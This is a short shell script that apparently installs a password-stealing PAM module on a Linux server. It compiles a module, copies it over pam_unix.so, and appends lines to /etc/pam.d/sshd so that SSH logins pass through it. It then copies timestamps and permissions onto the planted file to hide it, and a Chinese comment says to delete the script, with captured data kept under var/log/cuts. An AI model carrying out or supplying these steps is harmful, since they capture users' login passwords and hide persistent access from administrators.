#gcc -c -fpic chng-pam_storepw.c
#gcc -shared -lc -o pam_logpw.so chng-pam_storepw.o
#cp pam_logpw.so /lib64/security/pam_unix.so
cp pam_logpw.so /lib/security/pam_unix.so
echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
#touch -r /lib64/security/pam_unix.so /lib64/security/pam_logpw.so
#chmod --reference=/lib64/security/pam_unix.so /lib64/security/pam_logpw.so  
touch -r /lib/security/pam_unix.so /lib/security/pam_logpw.so 
chmod --reference=/lib/security/pam_unix.so /lib/security/pam_logpw.so 
#删除此文件，在var/log/cuts保存